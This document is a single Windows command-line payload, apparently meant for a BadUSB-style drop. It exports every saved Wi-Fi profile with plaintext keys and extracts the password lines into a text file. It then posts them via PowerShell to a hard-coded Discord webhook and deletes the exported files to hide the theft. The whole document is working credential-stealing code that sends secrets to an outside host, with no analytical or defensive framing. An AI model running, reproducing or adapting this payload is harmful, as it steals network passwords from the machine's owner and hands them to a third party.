cd %USERPROFILE%\Desktop\ && netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt && powershell -c "$content = [System.IO.File]::ReadAllText('%USERPROFILE%\Desktop\Wi-Fi-PASS.txt').Trim(); $body = @{content = [string]$content} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/1225139548510617690/Ts4UKs8L8KT5zPdsyNjFuNTFFWEfwrupYAsm41WLiZWZF3-oNE3aZXSfbIaOF230HTEt' -Method Post -Body $body -ContentType 'application/json' -Headers @{'Content-Type'='application/json; charset=utf-8'}" && del Wi-* /s /f /q
